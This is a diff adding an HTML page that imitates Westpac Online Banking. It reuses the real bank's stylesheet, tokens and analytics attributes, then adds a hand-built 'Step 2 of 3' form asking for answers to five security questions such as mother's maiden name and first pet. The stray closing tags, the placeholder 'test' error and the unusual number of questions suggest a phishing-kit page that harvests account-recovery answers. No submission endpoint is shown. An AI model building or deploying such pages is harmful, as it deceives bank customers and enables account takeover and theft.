@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" class="js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths cookies cors overthrow-enabled" lang="en">
+   <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge;chrome=1" />
+      <meta charset="utf-8" />
+      <title>Westpac Online Banking</title>
+      <meta name="description" content="" />
+      <meta name="HandheldFriendly" content="True" />
+      <meta name="MobileOptimized" content="320" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover" />
+      <meta name="apple-mobile-web-app-capable" content="yes" />
+      <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+      <link rel="apple-touch-icon" href="" />
+      <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Titan/WBC/000-0001combined.css.4c7a8722df72b201084fe3d6f3109795ef5f0e3b.css" rel="stylesheet" />
+      <meta name="apple-itunes-app" content="app-id=299111811" />
+      <link rel="manifest" href="https://www.westpac.com.au/_services/smart-app-banner/banking/manifest.serialise.json" />
+      <meta name="format-detection" content="telephone=no" />
+      <meta name="wup_url" content="https://wup-2ffe60ee.westpac.com.au/client/v3/web/wup?cid=willow" />
+      <meta name="log_url" content="https://log-2ffe60ee.westpac.com.au/api/v1/sendLogs" />
+   </head>
+   <style>
+   	.selectqa{
+   	margin-right:10px;
+   	width:90%; 
+   	}
+   	</style>
+   <body id="applicationBody" data-keymap-url="/eam/servlet/getEamInterfaceData" data-command="login" data-get-resources-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true&values=true" data-get-resources-checksum-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true" data-help-url="/wbc/banking/helpcontentandsearch" data-signin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=login&segment=personal" data-signout-url="https://banking.westpac.com.au/pkmslogout?token=f264d7a0-1df4-11ef-b660-005056a3d977" data-browser-incompatible-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/6" data-cookies-disabled-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/7" data-allow-console-logging="false" data-spsignin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=sp&segment=personal" data-is-stronger-password-feature-enabled="True" data-is-eam-policy-global-rollout="True" data-analytics-allkeys="autoImpr,experience,formName,pageKey,pageName,pageStep,pageType,sendDelay,siteVersion,src,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagestep="start" data-analytics-pagename="enter your customer id" data-analytics-senddelay="3000" data-analytics-autoimpr="TRUE" data-analytics-formname="olb" data-analytics-src="20231122-mob" data-analytics-pagetype="login" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="login" class="orientation-portrait">
+      <!-- ko ifnot: isSalesPathwayLogin() -->
+    
+      	
+      	
+      <!-- /ko -->
+      </div>
+      </div>
+      <div class="page view view-active" id="forgottenCustomerId" data-post-url="https://banking.westpac.com.au/wbc/banking/verifycustomer" data-analytics-allkeys="experience,formName,newFormName,pageKey,pageName,pageStep,pageType,siteVersion,trackOnce,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagename="enter customerdetails" data-analytics-newformname="forgot-credentials" data-analytics-pagestep="start" data-analytics-trackonce="true" data-analytics-pagetype="selfservice" data-analytics-formname="forgot-credentials" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="Mob_Authentication_forgottenCustomerId">
+         <header class="title-bar" role="banner">
+            <center>
+               <h1 tabindex="-1">Answer security questions</h1>
+            </center>
+            <!--a href="javascript:;" data-bind="click: navigateBack" class="button-back">
+               <span>back</span>
+               </a-->
+         </header>
+         <div role="main" class="no-footer">
+            <div class="message-bar">
+               <div class="message"></div>
+               <a class="close" href="javascript:;">
+               <img alt="Close message" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" />
+               </a>
+            </div>
+            <div class="validation-summary" style="display:block;">
+               <div class="message">
+                  <p><strong>Please correct the errors with the following fields:</strong></p>
+               </div>
+               <div class="errors"> test</div>
+            </div>
+            <form id="carddetails_form">
+               <span>Step 2 of 3 - Security questions and answers </span>
+               <fieldset>
+                  <div class="panel">
+    <h2>Answer security questions</h2>
+    <div class="form">
+        <!-- First Q&A -->
+        <div class="item item-select">
+            <label data-field-name="security-question-1" data-field-title="Security Question 1" for="security_details_question_1">
+                <span class="label">Security Question 1</span>
+                <span class="control">
+                    <select aria-required="true"  class="selectqa" data-bind="value: securityQuestion1" id="security_details_question_1">
+                        <option value="" disabled selected>Select a security question</option>
+                        <option value="first_pet">What was the name of your first pet?</option>
+                        <option value="street_name">What is the name of the street where you grew up?</option>
+                        <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                        <option value="first_school">What was the name of your first school?</option>
+                        <option value="favorite_book">What is your favorite book?</option>
+                    </select>
+                </span>
+            </label>
+        </div>
+        <div class="item item-text">
+            <label data-field-name="security-answer-1" data-field-title="Security Answer 1" for="security_details_answer_1">
+                <span class="label">Answer</span>
+                <span class="control">
+                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer1" id="security_details_answer_1" />
+                </span>
+                <span class="visually-hidden">100 characters is the maximum length of this field</span>
+            </label>
+        </div>
+
+        <!-- Second Q&A -->
+        <div class="item item-select">
+            <label data-field-name="security-question-2" data-field-title="Security Question 2" for="security_details_question_2">
+                <span class="label">Security Question 2</span>
+                <span class="control">
+                    <select aria-required="true" class="selectqa" data-bind="value: securityQuestion2" id="security_details_question_2">
+                        <option value="" disabled selected>Select a security question</option>
+                        <option value="first_pet">What was the name of your first pet?</option>
+                        <option value="street_name">What is the name of the street where you grew up?</option>
+                        <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                        <option value="first_school">What was the name of your first school?</option>
+                        <option value="favorite_book">What is your favorite book?</option>
+                    </select>
+                </span>
+            </label>
+        </div>
+        <div class="item item-text">
+            <label data-field-name="security-answer-2" data-field-title="Security Answer 2" for="security_details_answer_2">
+                <span class="label">Answer</span>
+                <span class="control">
+                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer2" id="security_details_answer_2" />
+                </span>
+                <span class="visually-hidden">100 characters is the maximum length of this field</span>
+            </label>
+        </div>
+
+        <!-- Third Q&A -->
+        <div class="item item-select">
+            <label data-field-name="security-question-3" data-field-title="Security Question 3" for="security_details_question_3">
+                <span class="label">Security Question 3</span>
+                <span class="control">
+                    <select aria-required="true"  class="selectqa" data-bind="value: securityQuestion3" id="security_details_question_3">
+                        <option value="" disabled selected>Select a security question</option>
+                        <option value="first_pet">What was the name of your first pet?</option>
+                        <option value="street_name">What is the name of the street where you grew up?</option>
+                        <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                        <option value="first_school">What was the name of your first school?</option>
+                        <option value="favorite_book">What is your favorite book?</option>
+                    </select>
+                </span>
+            </label>
+        </div>
+        <div class="item item-text">
+            <label data-field-name="security-answer-3" data-field-title="Security Answer 3" for="security_details_answer_3">
+                <span class="label">Answer</span>
+                <span class="control">
+                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer3" id="security_details_answer_3" />
+                </span>
+                <span class="visually-hidden">100 characters is the maximum length of this field</span>
+            </label>
+        </div>
+
+        <!-- Fourth Q&A -->
+        <div class="item item-select">
+            <label data-field-name="security-question-4" data-field-title="Security Question 4" for="security_details_question_4">
+                <span class="label">Security Question 4</span>
+                <span class="control">
+                    <select aria-required="true"  class="selectqa" data-bind="value: securityQuestion4" id="security_details_question_4">
+                        <option value="" disabled selected>Select a security question</option>
+                        <option value="first_pet">What was the name of your first pet?</option>
+                        <option value="street_name">What is the name of the street where you grew up?</option>
+                        <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                        <option value="first_school">What was the name of your first school?</option>
+                        <option value="favorite_book">What is your favorite book?</option>
+                    </select>
+                </span>
+            </label>
+        </div>
+        <div class="item item-text">
+            <label data-field-name="security-answer-4" data-field-title="Security Answer 4" for="security_details_answer_4">
+                <span class="label">Answer</span>
+                <span class="control">
+                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer4" id="security_details_answer_4" />
+                </span>
+                <span class="visually-hidden">100 characters is the maximum length of this field</span>
+            </label>
+        </div>
+
+        <!-- Fifth Q&A -->
+        <div class="item item-select">
+            <label data-field-name="security-question-5" data-field-title="Security Question 5" for="security_details_question_5">
+                <span class="label">Security Question 5</span>
+                <span class="control">
+                    <select aria-required="true"  class="selectqa" data-bind="value: securityQuestion5" id="security_details_question_5">
+                        <option value="" disabled selected>Select a security question</option>
+                        <option value="first_pet">What was the name of your first pet?</option>
+                        <option value="street_name">What is the name of the street where you grew up?</option>
+                        <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                        <option value="first_school">What was the name of your first school?</option>
+                        <option value="favorite_book">What is your favorite book?</option>
+                    </select>
+                </span>
+            </label>
+        </div>
+        <div class="item item-text">
+            <label data-field-name="security-answer-5" data-field-title="Security Answer 5" for="security_details_answer_5">
+                <span class="label">Answer</span>
+                <span class="control">
+                    <input type="text" aria-required="true" maxlength="100" data-bind="value: securityAnswer5" id="security_details_answer_5" />
+                </span>
+                <span class="visually-hidden">100 characters is the maximum length of this field</span>
+            </label>
+        </div>
+    </div>
+</div>
+<div class="description"></div>
+<div class="action-buttons action-buttons-count-2" style="margin-bottom:30%;">
+    <button type="button" class="button" data-bind="click: cancel">
+        <span>Cancel</span>
+    </button>
+    <button class="button-alt" data-bind="click: submit">
+        <span>Next</span>
+    </button>
+</div>
+                  
+
+                  </div>
+               
+            </form>
+         </div>
+      </div>
+      <footer style="margin-top:30%">
+         <div class="login-footer"><br>
+            <a class="help" href="https://www.westpac.com.au/personal-banking/online-banking/support-faqs/" data-analytics-nav="footer">
+            <span class="text">Help</span>
+            </a>
+         </div>
+      </footer>
+   </body>
+</html>
